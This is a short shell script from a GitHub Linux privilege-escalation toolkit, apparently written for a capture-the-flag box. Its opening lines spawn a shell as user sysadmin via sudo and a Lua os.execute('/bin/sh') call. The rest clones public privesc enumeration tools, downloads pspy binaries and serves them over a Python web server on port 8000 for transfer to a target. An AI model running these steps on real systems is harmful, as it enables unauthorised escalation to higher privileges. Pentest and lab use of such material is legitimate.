# src: https://github.com/mr-r3b00t/LinuxPrivescToolkit/blob/master/server.sh
#Upgrade to user
echo 'os.execute("/bin/sh")' > privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua

#Upgrade to root
there is a script running which can be found using pspy

mkdir privesc
cd privesc

git clone https://github.com/DominicBreuker/pspy

git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

git clone https://github.com/mzet-/linux-exploit-suggester

git clone https://github.com/jondonas/linux-exploit-suggester-2

git clone https://github.com/rebootuser/LinEnum

git clone https://github.com/belane/linux-soft-exploit-suggester

git clone https://github.com/sleventyeleven/linuxprivchecker

#download pSpy releases
cd pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
#make these executable
chmod +x pspy32
chmod +x pspy64
#go back to root directory
cd ..

echo "By the power of Greyskull.... I have the power!"
echo "Setting up a Python3 Web Server on TCP 8000"
python3 -m http.server 8000
echo "Complete"
